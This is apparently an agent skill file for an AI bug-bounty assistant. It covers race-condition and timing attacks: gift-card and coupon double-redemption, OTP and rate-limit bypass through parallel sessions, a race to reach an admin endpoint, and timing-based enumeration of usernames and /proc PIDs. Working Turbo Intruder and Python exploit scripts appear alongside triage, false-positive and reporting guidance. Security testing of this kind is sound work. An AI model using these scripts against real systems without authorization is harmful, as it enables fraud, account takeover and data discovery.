---
name: race-conditions
description: Race Conditions and Timing Attacks — gift card/coupon double-redemption, funds transfer duplication, OTP/rate-limit bypass via parallel submission, TOCTOU patterns, user enumeration via response timing, and data exfiltration via timing oracle. Use when HauntMode flags race conditions as APPLIES/MAYBE, when the app has check-then-act patterns, unique constraint enforcement, or any feature that should only execute once.
---

# Race Conditions & Timing Attacks (INDEX — Whitebox Attacks)

This skill covers detection, confirmation, and exploitation of race condition vulnerabilities and timing side-channels. Read top to bottom on first invocation; later runs can jump to the relevant section.

---

## 1. Triggers — when this skill applies

**Race conditions:**
- Gift card, coupon, or promo code redemption (classic TOCTOU: check balance → use → invalidate)
- Funds transfer, balance top-up, or reward point redemption
- Actions with a "one-per-user" or "one-per-account" constraint enforced without database locks
- Rate-limited actions (login attempts, OTP submission, API calls) — parallel requests may bypass
- File upload with post-upload processing (antivirus scan, resize) — file accessible during processing window
- Password reset token consumption — redeem the same token twice
- "Check-then-act" patterns in source code with no SQL `LOCK TABLES` / mutex / `session_write_close`
- PHP app using `session_start()` where session file locks are the only serialization mechanism

**Timing attacks:**
- Login / password-reset / registration endpoints where processing differs for valid vs invalid usernames (bcrypt only called for valid users)
- Any endpoint that does expensive computation (recursive file scan, hash computation, DB lookup) conditionally based on input validity
- Endpoints that return early on invalid input but do full processing on valid input — measurable time difference

---

---

## 3. 30-second triage

**Race condition suspect:**
1. Find an action that has a finite resource or "one use" constraint (coupon, gift card, trial, vote, file slot)
2. Ask: does the app check validity → then use → then mark used, in sequence with no lock? If yes, it is a candidate.
3. Manual test: send the same request twice simultaneously in Burp Repeater using "Send group in parallel" (Community edition workaround — see §6.1). Check if both responses show success.

**Timing attack suspect:**
1. Find an endpoint that returns the same error message for two cases (valid vs invalid username, correct vs incorrect path)
2. Send 5 requests with a known-valid value, note median response time
3. Send 5 requests with a known-invalid value, note median response time
4. If delta > ~50ms consistently → timing vulnerability exists; proceed to §7

---

## 4. PHP session lock gotcha (critical)

PHP uses file locks on session files. If the target is PHP and you send multiple requests with the **same** `PHPSESSID`, they serialize — no real parallelism. The race window disappears.

**Fix:** Log in multiple times to collect 5–10 distinct `PHPSESSID` values. Assign each parallel request a different session ID.

```python
# Collect sessions — send this login request ~10 times in Burp Repeater
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=testuser&password=testpass
# Copy each Set-Cookie: PHPSESSID=... from responses
```

---

## 5. Detection — race conditions

### 5.1 Manual parallel test (Burp Community)

1. Capture the target request (e.g., coupon redemption)
2. Right-click → Send to Repeater
3. Duplicate the tab 5–10 times (right-click tab → Duplicate)
4. Select all tabs in a group → Send group in parallel
5. If 2+ responses return "success" for a one-use resource → race condition confirmed

Note: Burp Community does not have Turbo Intruder. For precise timing (sub-ms), you need Turbo Intruder (Pro) or a custom script. For Community, parallel Repeater group is the workaround.

### 5.2 Identifying vulnerable patterns in source code

Look for the pattern: fetch → compute → update, with no lock:
```php
// Vulnerable pattern
$balance = check_gift_card_balance($code);   // check
if ($balance === 0) return "Invalid";
$user_balance = fetch_user_balance($username);
update_user_balance($username, $user_balance + $balance);  // use
invalidate_gift_card($code);                 // invalidate
```
No `LOCK TABLES` before the sequence → TOCTOU.

Safe pattern requires:
```sql
LOCK TABLES active_gift_cards WRITE, users WRITE;
-- ... operations ...
UNLOCK TABLES;
```

---

## 6. Exploitation — race conditions

### 6.1 Burp Community parallel send (manual PoC)

For gift card / coupon double-redemption:
1. Buy one gift card, capture the redemption request
2. Drop the request in proxy so it is NOT redeemed yet
3. Open request in Repeater, duplicate 5x
4. Select all → "Send group in parallel"
5. Check balance — if doubled, race condition confirmed

### 6.2 Turbo Intruder script (when user provides Pro or Python script option)

(Give to user as a [RUN THIS] command since Turbo Intruder is a Burp extension)

Template from notes:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=False
    )

    sessions = [
        "SESSION_ID_1",
        "SESSION_ID_2",
        "SESSION_ID_3",
        "SESSION_ID_4",
        "SESSION_ID_5",
    ]

    # Replace PHPSESSID in request with %s, then:
    for sess in sessions:
        engine.queue(target.req, sess, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

Modify request to have `Cookie: PHPSESSID=%s` before sending to Turbo Intruder.

### 6.3 Two-endpoint race (delete-then-access pattern)

From notes lab — race a delete action against a privileged access:
```python
# Session A → delete own user (drops a privilege check)
# Session B → access admin endpoint before deletion completes
# Both fire at the same gate
for i in range(15):
    engine.queue(delete_req, gate='race')
for i in range(15):
    engine.queue(admin_req, gate='race')
engine.openGate('race')
```

### 6.4 OTP brute force timing window

If OTP / 2FA codes expire after N seconds and rate limiting is per-session:
- Log in multiple times → collect N sessions
- Submit each OTP guess from a different session simultaneously
- Rate limit is per-session, not global → effective bypass

### 6.5 Rate limit bypass via parallel submission

Some apps count requests per time window per session. Submit N requests simultaneously — all arrive within the same window tick → all pass the rate check.

[RUN THIS]
```
# Use ffuf or a custom Python script to send parallel requests
# Provide to user — do not run directly
python3 race_exploit.py  # script per §6.2 pattern
```

---

## 7. Timing attacks

### 7.1 User enumeration via response timing

Applies when: app hashes password only for valid usernames (bcrypt/argon2 is expensive: 100–500ms). Invalid usernames return immediately.

Detection threshold calibration:
1. Send 5 requests with known-valid username → note average response time
2. Send 5 requests with known-invalid username → note average response time
3. If delta > 50ms → timing leak exists. Set threshold to midpoint.

Enumeration script (write this, give to user to run):
```python
import requests

URL = "http://TARGET/login"
WORDLIST = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
THRESHOLD_S = 0.15  # adjust based on calibration

with open(WORDLIST) as f:
    for username in f:
        username = username.strip()
        r = requests.post(URL, data={"username": username, "password": "invalid"})
        if r.elapsed.total_seconds() > THRESHOLD_S:
            print(f"Valid username: {username}")
```

Adjust `THRESHOLD_S`, POST body format, and add CSRF token extraction as needed.

### 7.2 Data exfiltration via timing oracle

Applies when: app does expensive conditional work (recursive filesystem scan, DB query) after receiving attacker-controlled input, but before the permission check fires.

Pattern from notes: `/filecheck?filepath=/proc/1/` → takes longer than `/filecheck?filepath=/invalid/` because `os.walk(/proc/1/)` runs before the permission check.

Exploit:
```python
import requests

URL = "http://TARGET/filecheck"
COOKIES = {"session": "YOUR_SESSION_COOKIE"}
THRESHOLD_S = 0.003

for pid in range(0, 500):
    r = requests.get(URL, params={"filepath": f"/proc/{pid}/"}, cookies=COOKIES)
    if r.elapsed.total_seconds() > THRESHOLD_S:
        print(f"Valid PID: {pid}")
```

Enumerate home directories: change path to `/home/<username>/` with a username wordlist.

**Sub-millisecond differences:** Require multiple samples and averaging. Timing is unreliable over the public internet — run multiple passes and keep only results that appear consistently.

---

## 8. Bypass techniques

| Obstacle | Approach |
|---|---|
| PHP session file locking serializes requests | Use a different `PHPSESSID` per request thread |
| Rate limiting blocks rapid enumeration | Space requests — use a timing oracle only (slower but undetected) |
| OTP rate limit per session | Multiple sessions, submit different guesses in parallel |
| Race window is very small (< 1ms) | Turbo Intruder with `pipeline=True` and `concurrentConnections=50` to tighten the window |
| App uses database-level locks | Race is not exploitable if locks cover the full critical section |
| Timing differences < 10ms over internet | Run 20+ samples, use statistical median, look for consistent outliers |

---

## 9. False-positive checks

- **Two success responses ≠ race condition:** Verify the resource was actually consumed twice (check balance, count, DB state). Some idempotent endpoints return success on every call by design.
- **Timing difference < 30ms over public internet:** Network jitter easily swamps this. Repeat 20+ times, look for bi-modal distribution. If distribution overlaps heavily → not reliably exploitable.
- **Rate limit bypass works locally but not on production:** CDN / load balancer may be applying rate limits at edge before requests reach the app.
- **PHP session locks prevent exploitation:** Confirm by verifying that different `PHPSESSID` values actually run concurrently (parallel Repeater shows simultaneous responses, not sequential).

---

## 10. Chain candidates

| Chain | Paired skill | Impact |
|---|---|---|
| Race condition on coupon redemption | `business-logic` | Financial loss / unlimited discount |
| Race condition on password reset token | `auth-bypass` | Account takeover via double-redemption |
| Race condition on file upload + exec | `file-upload`, `cmdi` | Execute uploaded file before AV scan removes it |
| Timing oracle for user enumeration + password spray | `auth-bypass` | Credential stuffing with confirmed usernames |
| Timing oracle for filesystem path enumeration | `ssrf`, `file-inclusion` | Discover internal paths to target with LFI/SSRF |
| Race condition on subscription/trial activation | `business-logic` | Unlimited free trials |

---

## 11. Reporting template

```
POTENTIAL FINDING: Race Condition — <Double-Redemption | Rate-Limit Bypass | TOCTOU | Timing Oracle>
Target: <URL / endpoint>
Parameter: <param name + location>
Pattern:
    <e.g. "check_gift_card_balance → update_user_balance → invalidate_gift_card with no DB lock">
Reproduction steps:
    1. <e.g. Purchase gift card code XXXX>
    2. <Capture redemption request>
    3. <Send 5 parallel copies with different session IDs>
    4. <Observe 2+ success responses>
    5. <Check balance — increased by 2x the gift card value>
Evidence:
    <HTTP responses showing double success, balance change screenshot>
PHP session lock workaround used: <yes/no — N different PHPSESSID values>
Impact:
    <e.g. "Attacker can redeem any gift card code unlimited times, draining store credit">
Chain potential: <other skills>
Next step: <e.g. "Confirm exploitation limit — how many times can one code be redeemed?">
```

---

## 12. Recon tracker vector strings

Only log if user explicitly says to.

- `race:double-redeem:<endpoint>` — double redemption confirmed
- `race:rate-limit-bypass:<endpoint>` — parallel requests bypass rate limit
- `race:timing-enum:<endpoint>` — timing-based user enumeration
- `race:timing-exfil:<endpoint>` — timing oracle for path/data discovery
- `race:no:<endpoint>` — tested, no exploitable window found
- `race:session-lock:<endpoint>` — PHP session locks present, different sessions required

---

## 13. What NOT to do

- Do NOT send hundreds of parallel requests without checking rate limits in `program-guidelines.txt` first — race testing is high-volume.
- Do NOT attempt race conditions on payment processing endpoints on production without explicit program permission — financial impact on real orders.
- Do NOT use only one session ID for PHP targets — session file locks will serialize all requests and you will get false negatives.
- Do NOT conclude "not exploitable" after a single parallel test attempt — race conditions are probabilistic and may require 20–50 attempts.
- Do NOT auto-log to recon tracker without explicit user instruction.
- Do NOT run Turbo Intruder yourself — it is a Burp extension the user runs. Provide the script and the [RUN THIS] instructions.
